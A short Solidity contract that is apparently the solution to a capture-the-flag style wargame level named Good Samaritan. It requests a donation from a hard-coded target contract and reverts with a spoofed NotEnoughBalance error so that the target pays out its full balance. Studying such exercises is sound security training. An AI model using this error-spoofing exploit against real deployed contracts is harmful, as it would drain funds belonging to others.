// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./interfaces/27_INotifyable.sol";
import "./interfaces/27_IGoodSamaritan.sol";

address constant INSTANCE = 0xE82B09DB213BE9baE20e9a46904a2CFEaBa88066;

contract GoodSamaritanSolution is INotifyable {
    error NotEnoughBalance();

    function solve() external {
        IGoodSamaritan(INSTANCE).requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
